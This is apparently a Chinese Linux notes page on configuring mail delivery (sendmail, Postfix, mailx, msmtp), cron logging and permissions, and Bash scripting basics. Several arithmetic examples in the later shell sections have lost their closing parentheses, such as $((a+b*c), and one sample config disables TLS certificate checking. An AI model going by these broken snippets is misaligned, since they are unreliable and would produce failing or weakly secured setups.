安装mailutils之后,默认配置即可收到crontab的邮件,使用mail命令即可查看邮件

1、ubuntu系统配置mail邮件服务器
ubuntu中sendmail函数可方便的发送邮件,sendmail先要安装两个包sendmail sendmail-cf,使用带附件则还需要安装sharutils
sudo apt-get install sendmail sendmail-cf sharutils
yum install sendmail sendmail-cf m4

可选包:
squirrelmail  // 提供webmail          
spamassassin  // 提供邮件过滤  
mailman       // 提供邮件列表支持  
dovecot       // 提供IMAP和POP接收邮件服务器守护进程  

验证sendmail已经安装成功并启动:ps aux | grep sendmail

配置
sendmail默认只会为本机用户发送邮件,只有把它扩展到整个Internet才会成为真正的邮件服务器,编辑sendmail的配置宏文件
vim /etc/mail/sendmail.mc
找到如下行修改Addr=0.0.0.0表明可以连接到任何服务器
DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1')dnl
生成新的配置文件:
#cd /etc/mail  
#mv sendmail.cf sendmail.cf~   // 做一个备份  
#m4 sendmail.mc > sendmail.cf  // >的左右有空格,提示错误没有安装sendmail-cf  

常用发送邮件方式如下:
1.写一般的邮件:mail test@126.com  Cc 编辑抄送对象,Subject:邮件主题,输入回车,邮件正文后,按Ctrl-D结束
2.快速发送方式:echo "邮件正文" | mail -s 邮件主题 test@126.com
3.文件内容作为邮件正文: mail -s test test@126.com < test.txt
4.发送带附件的邮件: uuencode 附件名 附件显示名 | mail -s 邮件主题 发送地址,如uuencode test.txt test.txt | mail -s Test test@126.com

2、Ubuntu安装Postfix邮件系统,配置发送邮件服务器
Postfix是Linux平台上应用广泛的邮件系统,Postifx是一个SMTP服务器,SMTP服务器也被称为MTA(message transfer agent)
Postfix是一种电子邮件服务器,它是由任职于IBM华生研究中心的荷兰籍研究员Wietse Venema为了改良sendmail邮件服务器而产生的

安装Mailutils,mailutils是一个命令行邮箱客户端,使用它可以很方便的发送和接收邮件,mailutils包含sendmail和postfix,也可以只安装postfix,postfix包含sendmail
sudo apt install mailutils

安装postfix时弹出两个配置,第一个是postfix配置类型,默认选择第二种:Internet Site,这几种配置分别表示:
No configuration:表示不要做任何配置
Internet Site:表示直接使用本地SMTP服务器发送和接收邮件
Internet with smarthos:表示使用本地SMTP服务器接收邮件,但发送邮件时不直接使用本地SMTP服务器,而是使用第三方smart host来转发邮件
Satellite system:表示邮件的发送和接收都是由第三方smarthost来完成。
Local only:表示邮件只能在本机用户之间发送和接收。

配置页面是输入系统邮件名字,保持默认
在第二个页面System mail name中填入域名即邮箱地址@符号后面的域名,比如wangjun@bonnenuit.vip就填bonnenuit.vip。当发件人的域名地址没有指定时Postfix会自动将这个域名添加到发件人的地址中

重新配制一个已经安装的软件包
sudo dpkg-reconfigure postfix

Postfix在安装过程中生成/etc/postfix/main.cf配置文件。安装完成后Postfix会自动运行。可以用下面的命令查看Postfix的版本。
$ mail --version
$ sudo postconf mail_version
mail_version = 3.3.0

邮件日志:/var/log/mail.log
postfix主配置:/etc/postfix/main.cf
保存用户邮件:/var/mail/

使用netstat来查看Postfix的监听情况:
$ sudo netstat -anptl

Postfix的master进程监听TCP 25号端口,发送测试邮件之前最好是查看25号端口是否被防火墙或主机商屏蔽,nmap可以扫描服务器的开放端口,运行sudo nmap your-server-ip命令,如果没有安装nmap先apt-get install nmap

配置Postfix
Postfix需要在配置中监听loopbackinterface,打开主Postfix配置文件/etc/postfix/main.cf,将inet_interfaces = all更为inet_interfaces = loopback-only,重启Postfix:sudo service postfix restart

查看邮件
登陆到需要收邮件的用户,直接在命令行里输入mail即可进入mail的终端,这里会列出了所有的邮件状态、提示未读的邮件,可以输入邮件前面的序号"１"来查看信息,如果没有未读邮件则返回No mail for user
$ mail
"/var/mail/myths": 1 message 1 new
>N 1 myths@localhost 三 5月 18 14:2 16/393
在第三行显示有1封邮件,其中1封未读。
第二列是邮件编号,最后一列是邮件主题,中间是收件日期。
最后一行?提示符表示等待输入命令。
输入邮件编号,回车后就可以打开该邮件进行阅读。
l|list 显示当前支持的命令列表
unread 标记为未读邮件
h|headers 显示当前的邮件列表
z回车后退后邮件列表。
q回车后退出。
d 删除当前邮件,指针并下移。
d1表示删除第一封邮件
d1-20表示删除20封邮件

发送邮件
用一行命令发送邮件:给example@qq.com发封邮件,运行命令后去邮箱example@qq.com查看是否收到邮件,如果收件箱里没有,可能在垃圾邮件里
mail -s "邮件主题" example@qq.com <<< '内容'
echo 'test content' | mail -s "test subject" 1024940433@qq.com

使用mail的命令提示发送邮件
给peter@qq.com发送邮件,并抄送给john@qq.com。邮件主题为Test Subject,内容为Merry christmas
mail -s 'Test Subject' peter@qq.com
输入该命令后回车,提示Cc:,这时输入抄送邮件地址john@qq.com,然后回车。
继续输入邮件正文内容Merry christmas,正文输入结束后,按Ctrl-D 结束输入并发送邮件。

从文件中读取邮件内容并发送
给邮箱example@qq.com发送邮件,邮件主题为Text message,邮件内容为/home/user/message.txt中的内容
mail -s '邮件主题' example@qq.com < /home/user/message.txt

抄送与密件抄送
给user1@qq.com发送邮件 ,并抄送给user2@qq.com,并密件抄送给user3@qq.com。
mail -s 'Subject' user1@qq.com -c user2@qq.com -b user3@qq.com < message.txt
-c表示抄送 ,-b表示密件抄送 。-c: carbon copy, -b: blind carbon copy。

给多个邮箱发送邮件
mail -s 'Subject' user1@qq.com,user2@qq.com,user3@qq.com < message.txt

指定发件人姓名和地址:使用-a参数追加邮件头信息,用来指定发件人姓名和地址。
echo "This is the message body" | mail -s "subject" user@qq.com -aFrom:sender@qq.com
echo "This is the message body" | mail -s "subject" user@qq.com -aFrom:John\< john@qq.com\>

给本机的其他用户发送邮件
echo 'hahahahahah' | mail -s "hello, this is a test!" root
echo 'hahahahahah' | mail -s "hello, this is a test!" root@ubuntu
这两种方法等价,第二种中的ubuntu是当前系统的主机名(hostname),安装部分设置为ububtu,系统邮件名默认的是主机名,也是ubuntu。
root用户mail查看邮件
# mail
"/var/mail/root": 1 message 1 new
>N   1 berlin75@LAPTOP-0K Wed Nov 13 02:35  13/564   hello, this is a test!
? 1
Return-Path: < berlin75@LAPTOP-0KMQM01D.localdomain>
X-Original-To: root@LAPTOP-0KMQM01D.localdomain
Delivered-To: root@LAPTOP-0KMQM01D.localdomain
Received: by LAPTOP-0KMQM01D.localdomain (Postfix, from userid 1000)
        id D966315C000000003F65; Wed, 13 Nov 2019 02:35:56 +0800 (CST)
Subject: hello, this is a test!
To: < root@LAPTOP-0KMQM01D.localdomain>
X-Mailer: mail (GNU Mailutils 3.4)
Message-Id: <20191112183556.D966315C000000003F65@LAPTOP-0KMQM01D.localdomain>
Date: Wed, 13 Nov 2019 02:35:56 +0800 (CST)
From: berlin75@LAPTOP-0KMQM01D.localdomain

hahahahahah
?

tail -n 33 /var/log/mail.log
Nov 13 02:35:56 LAPTOP-0KMQM01D postfix/pickup[6344]: D966315C000000003F65: uid=1000 from=< berlin75@LAPTOP-0KMQM01D.localdomain>
Nov 13 02:35:57 LAPTOP-0KMQM01D postfix/cleanup[6350]: D966315C000000003F65: message-id=<20191112183556.D966315C000000003F65@LAPTOP-0KMQM01D.localdomain>
Nov 13 02:35:57 LAPTOP-0KMQM01D postfix/qmgr[6027]: D966315C000000003F65: from=< berlin75@LAPTOP-0KMQM01D.localdomain>, size=427, nrcpt=1 (queue active)
Nov 13 02:35:57 LAPTOP-0KMQM01D postfix/local[6352]: D966315C000000003F65: to=< root@LAPTOP-0KMQM01D.localdomain>, relay=local, delay=0.6, delays=0.45/0.11/0/0.04, dsn=2.0.0, status=sent (delivered to mailbox)
Nov 13 02:35:57 LAPTOP-0KMQM01D postfix/qmgr[6027]: D966315C000000003F65: removed

添加附件:使用-A参数为邮件添加附件attach
echo "This is the message body" | mail -s "subject" user@qq.com -A /path/to/attached_file
echo "这里输入你邮件内容" | mail -s "邮件标题" -a 附件的路径 example@qq.com,example1@qq.com

如果服务器只有Ip地址,没有对应的域名,很可能收不到邮件。因为此处发出的邮件默认发件地址为:登录服务器的用户名@服务器的名字,而绝大部分收件人的邮件服务器会对发件电子邮件地址有效性做出判断,如果不与常规域名后缀如xxx.com等一致会判定为垃圾邮件而丢弃,所以需要改变发件地址

打开Postfix配置文件:
sudo vim /etc/postfix/main.cf
在文件末尾增加以下内容:
smtp_generic_maps = hash:/etc/postfix/generic
保存退出,打开以下文件:
sudo vim /etc/postfix/generic
添加以下内容:
你的用户名@你的服务器名字   你希望对方看到的电子邮件地址
如服务器登录用户名为user1,服务器名字为svr5,希望对方看到的电子邮件地址为user@126.com,那么添加内容为user1@svr5   user@126.com
如果希望对方回复,user@126.com应该是希望收到回复邮件的地址。如果不希望对方回复,那么这个地址可以不一定为真实地址,但格式要符合邮件地址要求,否则会被对方邮件服务器丢弃。
重启Postfix:
sudo service postfix restart

问题1:发件人地址不正确
在/var/log/mail.log日志中显示的发件人信息为:
Jul 15 15:28:08 mail postfix/pickup[856]: 2E7B6442DC: uid=1000 from=< wangjun>
Jul 15 15:28:08 mail postfix/cleanup[865]: 2E7B6442DC: message-id=<20190715072808.2E7B6442DC@bonnenuit.vip>
Jul 15 15:28:08 mail postfix/qmgr[857]: 2E7B6442DC: from=< wangjun@iZ94pe2uk6bZ>, size=264, nrcpt=1 (queue active)
from的地址不对,期望from的值为wangjun@bonnenuit.vip。
解决方案:
配置/etc/postfix/main.cf,将myhostname = iZ94pe2uk6b改为myhostname = bonnenuit.vip

3、ubuntu使用mail命令来发送邮件得先安装mailutils:sudo apt-get install mailutils
安装成功后就可以通过以下命令发送邮件了
echo '这里是邮件内容.' | mail -s "这里是邮件主题" example@qq.com

若是想使用外部smtp发送网络邮件还需要安装bsd-mailx:sudo apt-get install bsd-mailx
安装成功后配置/etc/mail.rc文件,在该文件末尾添加配置如下;
set from=111111@163.com  #设置发送邮箱
set smtp=smtp.163.com:25  #设置smtp服务器和端口
set smtp-auth-user=111111@163.com  #设置用户名,记得加域名
set smtp-auth-password=xxxxxx4444  #授权码
set smtp-auth=login  #认证方式

set from=xxxxxxxxx@qq.com
set smtp=smtps://smtp.qq.com:465
set smtp-auth-user=xxxxxxxxx@qq.com
set smtp-auth-password=<授权码>
set smtp-auth=login

配置完后执行source命令让该文件的修改立即生效,这个时候收到邮件后就会发现发件人不一样了。
echo "content"| mailx -s "Title" xx@163.com

4、smtp协议
首先需要装smtp客户端,推荐msmtp这个smtp客户端
使用smtp发送邮件的话,那么postfix/sendmail就不再需要了,可以卸载掉
apt-get purge postfix  #彻底卸载postfix(如果之前使用的服务端是sendmail的话就改成sendmail)
apt-get purge mailutils #彻底卸载mailutils,mail都发送到外部邮箱去了,因此mail命令也没用了,如果还想在本地发送邮件的话,保留也可以
apt-get auto-remove    #清理掉不再使用的依赖项

安装msmtp
之后安装msmtp,注意的是有两个软件包都要装:
apt-get install msmtp-mta #只装这一个就可以了,因为这个软件包依赖于msmtp,会自动安装。msmtp-mta这个软件包会将/usr/sbin/sendmail --> /usr/bin/msmtp做一个软连接,也就是会将原来使用sendmail发送邮件的程序改为使用msmtp发送。
如果此时安装mailutils(可选),会发现由于存在/usr/sbin/sendmail,所以既不会安装sendmail也不会安装postfix。

配置msmtp
msmtp安装完毕并不存在全局配置文件,需要时可以自己建立一个。具体的命令行语法看--help帮助就可以了。
msmtp支持全局配置/etc/msmtprc和用户个性配置~/.msmtprc,需要所有用户使用同样的msmtp配置的话,只建立/etc/msmtprc就可以了

vim /etc/msmtprc
defaults
logfile /var/log/msmtp.log  #注意权限,普通用户可能没有写入这个文件的权限,可以管理员授权
syslog on                   #这个选项是记录到syslog的,可以去掉这一行,默认是off
aliases /etc/aliases        #先看看这个文件是否存在,如果不存在就不要加这一行,这一行的作用后面再说

account default
host smtp.ym.163.com
from user@domain.com
user user@domain.com
password mypass
auth on
tls on
tls_certcheck off

使用网易企业邮箱的smtp服务器发送邮件的,开启了tls。这里根据需要自己调整,如果使用QQ邮箱或是gmail等其他邮箱,请参考邮箱帮助文档配置smtp

配置完毕之后测试一下
msmtp -Sd看一下输出,检测一下变量,看看有没有问题,发送一封邮件试试echo -e "Subject: Test Mail\r\n\r\nThis is a test mail" |msmtp --debug -t youremail@domain ,看一下输出,如果能收到邮件的话,那么msmtp的配置就结束了

使用msmtp替换sendmail,成为crontab发送邮件的客户端
只需安装msmtp-mta这个软件包即可,会自动做软连接,上面提到过,如果没装的话,也可以手工软连接/usr/lib/sendmail和/usr/sbin/sendmail两个文件到/usr/bin/msmtp,之后如果crontab发送邮件的时候,就会使用msmtp了。

中文乱码
邮件有content type属性,设置为text/plain; charset=utf-8就可以搞定了。crontab有一个CONTENT_TYPE变量(详见man 5 crontab,搜索charset这个关键字即可找到相关内容),在crontab中定义CONTENT_TYPE=text/plain; charset=utf-8就可以了

【 查看crontab的日志记录 】
查看cron日志:/var/log/syslog

Ubuntu服务器/var/log下没有cron日志
修改rsyslog系统日志
sudo vim /etc/rsyslog.d/50-default.conf
cron.* /var/log/cron.log #将cron前面的注释符去掉

重启rsyslog
sudo service rsyslog restart
sudo service cron restart

查看crontab日志
less  /var/log/cron.log

【 权限 】
/etc/cron.deny该文件中所列用户不允许使用crontab命令
/etc/cron.allow该文件中所列用户允许使用crontab命令

用法:
1、如果两个文件都不存在则只有root用户才能使用crontab命令。
2、如果cron.allow存在但cron.deny不存在,则只有列在cron.allow文件里的用户才能使用crontab命令,如果root用户也不在里面则root用户也不能使用crontab。
3、如果cron.allow不存在,cron.deny存在,则只有列在cron.deny文件里面的用户不能使用crontab命令,其它用户都能使用。
4、如果两个文件都存在则列在cron.allow文件中且没有列在cron.deny中的用户可以使用crontab,如果两个文件中都有同一个用户则以cron.allow文件里面是否有该用户为准,如果cron.allow中有该用户则可以使用crontab命令。

AIX中普通用户默认都有crontab权限,如果要限制用户使用crontab就需要编辑cron.deny
HP-UNIX中默认普通用户没crontab权限,要想放开普通用户的crontab权限可以编辑cron.allow

</pre>
</div>


<div id="shell">
<h2>shell</h2><pre>
Shell是一个用C语言编写的程序,是用户使用Linux的桥梁
Shell既是一种命令语言,又是一种程序设计语言。
Shell是指一种应用程序,这个应用程序提供了一个界面,用户通过这个界面访问操作系统内核的服务。
Ken Thompson \的 \sh \是第一种 Unix Shell,Windows Explorer是一个典型的图形界面Shell

Shell脚本(shell script)是一种为shell编写的脚本程序

【 Shell环境 】
Shell编程跟java、php编程一样,只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以

Linux的Shell种类众多,常见的有:
Bourne Shell(/usr/bin/sh或/bin/sh)
Bourne Again Shell(/bin/bash)Bash 也是大多数Linux系统默认的Shell
C Shell(/usr/bin/csh)
K Shell(/usr/bin/ksh)
Shell for Root(/sbin/sh)

Ubuntu默认采用的是 dash
ls -l /bin/sh 看看
结果是: /bin/sh -> dash

echo $SHELL  # 查看当前环境所使用的shell解释器

shell脚本中的语句不是在当前shell中执行,而是新开shell来执行脚本
在脚本中改变当前目录,脚本结束之后还是之前的目录

如果要在当前shell中执行脚本可以使用source命令
$ source file.sh
file.sh中的语句改变当前目录,脚本执行结束之后是新的工作目录

【 env和解释器 】
在Linux的一些脚本里,需在开头一行指定脚本的解释程序,如:
#!/usr/bin/env Python
#!/usr/bin/env perl
#!/usr/bin/env zimbu

但有时候也用
#!/usr/bin/python
#!/usr/bin/perl
#!/usr/bin/php

那么env到底有什么用？何时用这个呢？
脚本用env启动因为脚本解释器在linux中可能被安装于不同的目录,env可以在系统的PATH目录中查找,同时env还规定一些系统环境变量。

如果将解释器路径写死在脚本里,可能在某些系统就会存在找不到解释器的兼容性问题,有时候执行一些脚本时就碰到这种情况。

【 shell脚本编辑与运行 】
打开文本编辑器(可用vi/vim命令来创建文件),新建文件test.sh(sh代表shell)
扩展名并不影响脚本执行,见名知意就好
如果用php写shell脚本,扩展名就用php好了

#! 是一个约定的标记,指定该脚本的解析器,告诉系统这个脚本需要什么解释器哪一Shell来执行

#!/bin/bash
echo "Hello World !"

运行Shell脚本有两种方法:
1、作为可执行程序
chmod +x ./test.sh  #使脚本具有执行权限
./test.sh  #执行脚本

一定要写成 ./test.sh,而不是test.sh,运行其它二进制的程序也一样
直接写test.sh,linux系统会去PATH里寻找有没有叫test.sh的,而只有/bin, /sbin, /usr/bin,/usr/sbin等在PATH里,当前目录通常不在PATH里,所以写成test.sh是会找不到命令的,要用./test.sh告诉系统就在当前目录找

2、作为解释器参数
这种运行方式是直接运行解释器,其参数就是shell脚本的文件名,如:
/bin/sh test.sh
/bin/php test.php
bash test.sh
dash test.sh

bash和sh用法存在差异

【 Bash的错误处理 】
command || exit 1     # command命令执行失败即终止执行退出脚本
command1 && command2  # command1执行成功才能执行command2
command || true       # command命令即使执行失败,true使得这一行语句总是会执行成功,脚本也不会终止执行

如果停止执行之前需要完成多个操作,就要采用下面三种写法。
command || { echo "command failed"; exit 1; }
if ! command; then echo "command failed"; exit 1; fi
command; if [ "$?" -ne 0 ]; then echo "command failed"; exit 1; fi

set -e使得脚本只要发生错误就终止执行
set -e根据返回值来判断一个命令是否运行失败。但是某些命令的非零返回值可能不表示失败,或者开发者希望在命令失败的情况下,脚本继续执行下去。这时可以暂时关闭set -e,该命令执行结束后,再重新打开set -e。
set +e      # 关闭-e选项
command1
command2
set -e      # 重新打开-e选项

set -e有一个例外情况,就是不适用于管道命令。
管道命令就是多个子命令通过管道运算符(|)组合成为一个大的命令。Bash会把最后一个子命令的返回值,作为整个命令的返回值。即只要最后一个子命令不失败,管道命令总是会执行成功,因此它后面命令依然会执行,set -e就失效了
set -o pipefail用来解决这种情况,只要一个子命令失败,整个管道命令就失败,脚本就会终止执行

#!/usr/bin/env bash
set -eo pipefail
foo | echo a      # foo是一个不存在的命令
echo bar

这两种写法建议放在所有Bash脚本的头部
# 写法一
set -euxo pipefail

# 写法二
set -eux
set -o pipefail

另一种办法是在执行Bash脚本的时候从命令行传入这些参数。
$ bash -euxo pipefail script.sh

</pre>if [ $? -eq 0 ]<textarea>#!/bin/bash
#遍历指定目录下文件iconv编码转换

directory="/home/wzy/Downloads/execl"
f_encoding="utf-8"
t_encoding="gbk"

for dir in `ls $directory`
do
  if [ -d $directory/$dir ]
  then
    for file in `ls $directory/$dir`
    do
      if [ -e $directory/$dir/$file ]
      then
        iconv -f $f_encoding -t $t_encoding $directory/$dir/$file -o $directory/$dir/iconv.$file
        if [ $? -eq 0 ]
        then
          rm $directory/$dir/$file
        fi
      fi
    done
  fi
done

</textarea><pre>
【 sh命令 】
sh命令是shell命令语言解释器,执行命令从标准输入读取或从一个文件中读取。通过用户输入命令和内核进行沟通
Bourne Again Shell(bash)是自由软件基金会(GNU)开发的一个Shell,是Linux系统中一个默认的Shell。Bash不但与Bourne Shell兼容,还继承了C Shell、Korn Shell等优点

bash [options] [file]

选项
-c string:命令从-c后的字符串读取。
-i:实现脚本交互。
-n:进行shell脚本的语法检查。
-x:实现shell脚本逐条语句的跟踪。

【 脚本执行与调试 】
1、绝对路径执行,要求文件有执行权限
2、以sh命令执行,不要求文件有执行权限
3、.加空格或source命令执行,脚本将在当前shell中执行

4、不会运行命令并仅检查语法错误,没有错误不显示内容: bash -n test.sh

5、检查脚本语法: bash -v test.sh
功能: 区别于-x参数,该选项打印命令行的原始内容,-x参数打印出经过替换后命令行的内容
场合: 仅想显示命令行的原始内容

6、跟踪脚本执行: bash -x test.sh
启动调试,进入调试模式后,Shell依次执行读入的语句,产生的输出中有的带加号,有的不带
带加号表示该条语句是Shell执行的,不带加号表示该语句是Shell产生的输出

7、中断调试
在调试过程中可以按Ctrl + Z中断调试,观察结果,然后再按fg键继续调试即可。

8、调试代码块
上面的-x选项是调试整个脚本的,如果脚本很大,会很不方便,还有一种方法是调试某一块代码的,如下
set -x
...
code block
...
set +x
这样,只对set -x与set +x之间的代码进行跟踪。

9、调试函数
set -x
Function call
set +x

10、-c
功能: 该选项使Shell解析器从字符串而非文件中读取并执行命令
场合: 当需要调试一小段脚本的执行结果时,非常方便
示例: # bash -c 'x=1;y=2;let z=x+y;echo "z=$z"'

11、通过test的方式,返回值为0为真,1表假
$ [ 2 -lt 3 ]
$ echo $?
0
$ [ 2 -gt 3 ]
$ echo $?
1
$ test -f /etc/hosts
$ echo $?
0

12、通过trap来调试

</pre>示例:<textarea>#!/bin/bash
errorTrap(){
  echo "[LINE:$1]Error: Command or function exited with status $?"
}
foo(){
  return 1;
}
trap 'errorTrap $LINENO' ERR
abc
foo
脚本输出:
[root@localhost:shell]# bash test.sh
test.sh: line 12: abc: command not found
[LINE:12]Error: Command or function exited with status 127
[LINE:9]Error: Command or function exited with status 1

</textarea><pre>
【 常见错误诊断 】
xxx.sh: cannot shift
这种错误一般是参数传递有误,比如没有给参数或者参数个数少了。因为shell脚本使用shift来获取下一个参数,如果个数不对shift命令就会失败。

xxx.sh: ^M: not found
^M是Windows上的回车符\r在UNIX上的显示形式。这种情况多半是在Windows上编辑了shell脚本,然后拿到UNIX/Linux上执行。只要将文件中所有的\r删除即可。

tr -d "\r" < oldfile.sh > newfile.sh
或者一个更标准的方法,因为\r的ASCII码是\015,所以可以这样。

tr -d "\015" < oldfile.sh > newfile.sh

【 Shell注释 】
以"#"开头的行就是注释,会被解释器忽略。
sh里没有多行注释,只能每一行加一个#号

如果在开发过程中,遇到大段的代码需要临时注释起来,过一会儿又取消注释,怎么办呢？
每一行加个#符号太费力了,可以把这一段要注释的代码用一对花括号括起来,定义成一个函数,没有地方调用这个函数,这块代码就不会执行,达到了和注释一样的效果

【 基本语法 】
每行不得多于255个字节,可在行末加上反斜杠的方式拆分单行内容到多行中

多命令以分号分隔时,命令从左至右依次执行。
whoami;w

多命令以&&分隔时命令从左至右按前面命令执行成功后再执行下个命令的原则依次执行
make && make install

多命令以||分隔时命令从左至右按前面命令执行失败后再执行下个命令的原则依次执行

多个命令以分号分隔放置()中则会启用子shell并执行。
(mkdir testdir;cd testdir;touch testfile)

多个命令以分号分隔放置{}中则会在当前shell中执行,命令和{}必须有空格间隔,并且最后一条命令也必须加分号。
{ mkdir testdir;cd testdir;touch testfile; }

反引号｀括起来的命令或$(命令),shell将直接引用执行结果
test=`date`
test=$(date)

【 返回码 】
任何命令执行后均会返回一个取值范围在0~255之间的整型返回码。主要值含义如下:
0:正常结束
1:通用执行错误
2:误用shell命令
126:命令不可执行
127:命令未找到
128:无效退出参数
130:被ctrl-c强行中止
255:退出状态码越界
shell script默认返回最后一条命令的返回码。可以使用exit退出script执行并返回指定的返回码。
例如:exit 15

通过$?这个系统变量可以获取上一条命令的返回码。如:echo $?

【 利用mktemp建立临时文件 】
语法:mktemp 选项 临时文件模板
如果建立成功返回0
临时文件模板格式形式如:/tmp/test.XXXXXX或/usr/ttt/tttt.XXXXXX,文件名末6个字符必须为XXXXXX,生成成功后会由系统代替为随机6个字符。
-q: 不产生错误信息。
-p: 指定建立临时文件的父级目录,父级目录必须已存在,例如mktemp -p /usr/tmp tf.XXXXXX
-t: 按环境变量TMPDIR变量中指定的父级目录建立临时文件,如变量未定义则父级目录为/tmp
-d: 建立的是临时目录。

直接执行mktemp会在/tmp目录下建立tmp.XXXXXX形式的临时文件,文件名末6个字符为随机字符,可使用下面方式获取生成的文件名。
tmpfile=$(mktemp)

outtmp=/tmp/$$`date +%s%N`.outtmp # 临时文件定义

【 Bash三元条件 】
${varname:-word}    # 如果varname存在且不为null则返回其值,否则返回word
${varname:=word}    # 如果varname存在且不为null则返回其值,否则设置它,然后返回其值
${varname:+word}    # 如果varname存在且不为null则返回word,否则返回null
${varname:offset:length}    # 执行子字符串扩展,返回$varname的子字符串,从offset开始,最多为length的字符

【 Linux let命令 】
let命令是BASH中用于计算的工具,用于执行一个或多个表达式,变量计算中不需要加上$来表示变量
如果表达式中包含了空格或其他特殊字符,则必须引起来

自加操作:let no++
自减操作:let no--
简写形式:let no+=10,let no-=20分别等同于let no=no+10,let no=no-20

let a=5+4
let b=9-3
echo $a $b

</pre>
</div>

<div id="shell_var">
<h3>shell变量</h3><pre>
在使用变量时要在变量前面加上符号$,但定义的时候不需要

变量名的命名须遵循如下规则:
命名只能使用英文字母,数字和下划线,首个字符不能以数字开头。
中间不能有空格,可以使用下划线(_)
不能使用标点符号
不能使用bash里的关键字(可用help命令查看保留关键字)

shell在定义变量时变量名与变量之间不能存在空格
赋值时等号两边不能有空格
your_name="runoob.com"

除了显式地直接赋值,还可以用语句给变量赋值,如:
for file in `ls /etc`   将 /etc 下目录的文件名循环出来
for file in $(ls /etc)  将 /etc 下目录的文件名循环出来

使用一个定义过的变量,只要在变量名前面加美元符号即可,如:
your_name="qinjx"
echo $your_name
echo ${your_name}

变量名外面的花括号是可选的,加花括号是为了帮助解释器识别变量的边界,比如下面这种情况:
for skill in Ada Coffe Action Java; do
    echo "I am good at ${skill}Script"
done

输出:
I am good at AdaScript
I am good at CoffeScript
I am good at ActionScript
I am good at JavaScript

如果不给skill变量加花括号,写成echo "I am good at $skillScript",解释器就会把$skillScript当成一个变量(其值为空)
推荐给所有变量加上花括号,这是个好的编程习惯

A="a b c def"      # 将字符串复制给变量
A=`cmd`            # 将命令结果赋给变量
A=$(cmd)           # 将命令结果赋给变量
eval a=\$$a        # 间接调用
i=2&&echo $((i+3) # 计算后打印新变量结果
i=2&&echo $[i+3]   # 计算后打印新变量结果
a=$((2>6?5:8)     # 判断两个值满足条件的赋值给变量
A=(a b c def)      # 将变量定义为組数

【变量类型】
运行shell时,会同时存在三种变量:
1) 局部变量 在脚本或命令中定义,仅在当前shell实例中有效,其他shell启动的程序不能访问局部变量。
2) 环境变量 所有的程序包括shell启动的程序都能访问环境变量,有些程序需要环境变量来保证其正常运行。必要时shell脚本也可以定义环境变量。
3) shell变量 shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量,有一部分是局部变量,这些变量保证了shell的正常运行

【变量的范围】
1、未经特殊处理的变量均为全局变量
脚本中定义了的变量可以在该脚本中任何其他地方使用,函数内部定义的变量也可以在该函数以外使用。

2、可以用export把普通变量变成环境变量
环境变量可以被其子进程使用,而普通变量不可以。
export $var

export  variable_name=value
#or
variable_name=value
export  variable_name

3、可以用local来定义一个局部变量
local关键字只能在函数内部使用,用local定义的变量只能在本函数
local ret   # 局部变量

【只读变量】
使用readonly命令可以将变量定义为只读变量,只读变量的值不能被改变,不可以被重新定义,不允许再次设置
myUrl="http://www.w3cschool.cc"
readonly myUrl

$ readonly        # 查看系统存在的只读文件
declare -r BASHOPTS="checkwinsize:cmdhist:complete_fullquote:expand_aliases:extglob:extquote:force_fignore:histappend:interactive_comments:login_shell:progcomp:promptvars:sourcepath"
declare -ir BASHPID
declare -r BASH_COMPLETION_COMPAT_DIR="/etc/bash_completion.d"
declare -ar BASH_VERSINFO='([0]="4" [1]="3" [2]="48" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")'
declare -ir EUID="1000"
declare -ir PPID="3"
declare -r SHELLOPTS="braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor"
declare -ir UID="1000"

【 删除变量 】
使用unset命令可以删除变量,变量被删除后不能再次使用,unset命令不能删除只读变量
unset variable_name

【 常用系统变量 】
系统变量只能引用不能修改

有些变量是一开始执行Script时就会设定,拥有特定含义,并且不能加以修改的。这些是系统特殊变量:
$0 当前shell脚本程序的名称
$n 脚本或函数的第n个参数值,n=1..9
$* 脚本或函数的所有参数
$# 脚本或函数的参数个数
$@ 分别用双引号引用命令行上的所有参数
$$ 当前shell进程标识符pid
$! 上一个shell后台进程的pid
$? 上一条命令返回值

其他参数:
$CDPATH    包含一系列目录名,cd命令对他们诸葛进行搜索来查找作为参数传递给它的目录;如果该变量未设置,cd命令搜索当前目录
$EDITOR    程序(如e-mail程序)里使用的默认编辑器
$ENV       UNIX查找配置文件的路径
$PWD       当前工作目录的名称
$OLDPWD    之前一个目录的路径
$HOME      用户初次登录时的起始目录名
$MAIL      用户的系统邮箱文件的名称
$MAILCHECK 检查用户邮箱是否有新邮件并将结果通知用户的间隔时间(以秒为单位)
$PATH      包含用户的搜索路径的变量—shell用来搜索外部命令或程序的目录
$PPID      父进程的进程ID
$PS1       系统第一个提示符,一般为$
$PS2       系统第二个提示符,一般为>
$TERM      用户的控制终端的类型.
$LINENO    所在的代码行,一般用来输出错误行号
$RANDOM    随机数
$USER      当前用户
$UID       当前UID

</pre>
</div>

<div id="calcfuhao">
<h3>shell中各种括号的作用详解()、(()、[]、[[]]、{}</h3>
<h4>一、小括号,圆括号()</h4><pre>
1、单小括号()
①命令组。括号中的命令将会新开一个子shell顺序执行,所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开,最后一个命令可以没有分号,各命令和括号之间不必有空格。

②命令替换。等同于`cmd`,shell扫描一遍命令行发现了$(cmd)结构,便将$(cmd)中的cmd执行一次,得到其标准输出,再将此输出放到原来命令。有些shell不支持如tcsh。

③用于初始化数组。如:array=(a b c d)

2、双小括号(( )
①整数扩展。这种扩展计算是整数型的计算,不支持浮点型。((exp)结构扩展并计算一个算术表达式的值,如果表达式的结果为0,那么返回的退出状态码为1或"假",而一个非零值的表达式所返回的退出状态码将为0或"true"。若是逻辑判断,表达式exp为真则为1,假则为0。

②只要括号中的运算符、表达式符合C语言运算规则,都可用在$((exp)中,甚至是三目运算符。
作不同进位(如二进制、八进制、十六进制)运算时,输出结果全都自动转化成了十进制。如:echo $((16#5f)结果为95(16进位转十进制)

$(( )与整数运算
bash中整数运算符号
+ - * / %  分别为加、减、乘、除、余数运算
& | ^ !    分别为"AND、OR、XOR、NOT"

在$(( )中的变量名称,可于其前面加$符号来替换,也可以不用
$ echo $((2*3)       # 6
$ a=5;b=7;c=2
$ echo $((a+b*c)     # 19
$ echo $(($a+$b*$c)  # 19

③单纯用(( ) 也可重定义变量值,比如 a=5;((a++) 可将 $a 重定义为6

